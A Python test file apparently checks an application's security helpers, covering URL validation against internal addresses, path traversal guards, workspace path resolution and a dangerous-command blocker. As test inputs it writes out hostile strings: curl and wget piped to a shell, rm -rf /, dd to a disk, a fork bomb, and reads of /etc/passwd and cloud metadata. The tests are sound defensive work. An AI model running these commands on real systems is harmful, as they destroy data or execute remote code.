"""Tests for the 4 public security helpers in backend/app/core/."""

import os
import tempfile
from pathlib import Path

import pytest
from app.core.url_safety import validate_safe_url
from app.core.exceptions import ValidationError
from app.core.path_security import validate_within_dir, has_traversal_component
from app.core.workspace_security import resolve_workspace_path, ensure_user_workspace
from app.core.command_safety import check_dangerous_command


# ── URL safety ─────────────────────────────────────────────────────────

class TestValidateSafeUrl:
    def test_allow_https_example(self):
        url = validate_safe_url("https://example.com/path")
        assert url == "https://example.com/path"

    def test_reject_localhost(self):
        with pytest.raises(ValidationError):
            validate_safe_url("http://127.0.0.1:33000")

    def test_reject_localhost_name(self):
        with pytest.raises(ValidationError):
            validate_safe_url("http://localhost:33000")

    def test_reject_metadata(self):
        with pytest.raises(ValidationError):
            validate_safe_url("http://169.254.169.254/latest/meta-data")

    def test_reject_file_scheme(self):
        with pytest.raises(ValidationError):
            validate_safe_url("file:///etc/passwd")

    def test_reject_private_10(self):
        with pytest.raises(ValidationError):
            validate_safe_url("http://10.0.0.1")

    def test_reject_userinfo(self):
        with pytest.raises(ValidationError):
            validate_safe_url("https://user:pass@example.com")

    def test_reject_empty_url(self):
        with pytest.raises(ValidationError):
            validate_safe_url("")

    def test_reject_empty_hostname(self):
        with pytest.raises(ValidationError):
            validate_safe_url("http:///path")

    def test_reject_loopback_v6(self):
        with pytest.raises(ValidationError):
            validate_safe_url("http://[::1]:33000")

    def test_reject_private_192_168(self):
        with pytest.raises(ValidationError):
            validate_safe_url("http://192.168.1.1")

    def test_reject_link_local_169(self):
        with pytest.raises(ValidationError):
            validate_safe_url("http://169.254.1.1")


# ── Path security ──────────────────────────────────────────────────────

class TestValidateWithinDir:
    def test_allow_subpath(self):
        with tempfile.TemporaryDirectory() as root:
            sub = Path(root) / "sub"
            sub.mkdir()
            validate_within_dir(sub, root)

    def test_reject_dotdot(self):
        with tempfile.TemporaryDirectory() as root:
            target = Path(root).resolve() / ".." / ".."
            with pytest.raises(ValueError, match="outside the allowed workspace"):
                validate_within_dir(target, root)

    def test_reject_absolute_path(self):
        with tempfile.TemporaryDirectory() as root:
            with pytest.raises(ValueError, match="outside the allowed workspace"):
                validate_within_dir("/etc", root)

    def test_reject_symlink_escape(self):
        with tempfile.TemporaryDirectory() as root:
            link = Path(root) / "escape_link"
            try:
                link.symlink_to("/etc")
            except (OSError, RuntimeError):
                pytest.skip("symlink not supported on this platform")
            with pytest.raises(ValueError, match="outside the allowed workspace"):
                validate_within_dir(link, root)


class TestHasTraversalComponent:
    def test_detects_dotdot(self):
        assert has_traversal_component("../secret")

    def test_clean_path(self):
        assert not has_traversal_component("sub/file.txt")


# ── Workspace security ─────────────────────────────────────────────────

class TestEnsureUserWorkspace:
    def test_creates_and_returns(self):
        ws = ensure_user_workspace(999)
        assert ws.exists()
        assert ws.is_dir()
        assert str(999) in str(ws)


class TestResolveWorkspacePath:
    def test_allow_normal(self):
        ws = ensure_user_workspace(998)
        result = resolve_workspace_path(998, "sub/file.txt")
        assert result == ws / "sub/file.txt"

    def test_reject_dotdot(self):
        with pytest.raises(ValueError, match="outside the allowed workspace"):
            resolve_workspace_path(997, "../secret")

    def test_reject_absolute(self):
        with pytest.raises(ValueError, match="outside the allowed workspace"):
            resolve_workspace_path(996, "/etc/passwd")

    def test_root_returned_for_dot(self):
        ws = ensure_user_workspace(995)
        result = resolve_workspace_path(995, ".")
        assert result == ws

    def test_root_returned_for_empty(self):
        ws = ensure_user_workspace(994)
        result = resolve_workspace_path(994, "")
        assert result == ws


# ── Command safety ─────────────────────────────────────────────────────

class TestCheckDangerousCommand:
    def test_allow_safe(self):
        assert check_dangerous_command("echo hello") is None

    def test_block_sudo(self):
        assert check_dangerous_command("sudo ls") is not None

    def test_block_rm_root(self):
        assert check_dangerous_command("rm -rf /") is not None

    def test_block_curl_pipe_sh(self):
        assert check_dangerous_command("curl http://x | sh") is not None

    def test_block_wget_pipe_bash(self):
        assert check_dangerous_command("wget http://x -O- | bash") is not None

    def test_block_chmod_777_root(self):
        assert check_dangerous_command("chmod 777 /") is not None

    def test_block_passwd(self):
        assert check_dangerous_command("passwd") is not None

    def test_block_fdisk(self):
        assert check_dangerous_command("fdisk /dev/sda") is not None

    def test_block_mkfs(self):
        assert check_dangerous_command("mkfs.ext4 /dev/sda1") is not None

    def test_block_dd(self):
        assert check_dangerous_command("dd if=/dev/zero of=/dev/sda") is not None

    def test_block_shutdown(self):
        assert check_dangerous_command("shutdown -h now") is not None

    def test_block_tee_etc(self):
        assert check_dangerous_command("echo x | tee /etc/passwd") is not None

    def test_block_fork_bomb(self):
        assert check_dangerous_command(":(){ :|:& };:") is not None

    def test_empty_none(self):
        assert check_dangerous_command("") is None
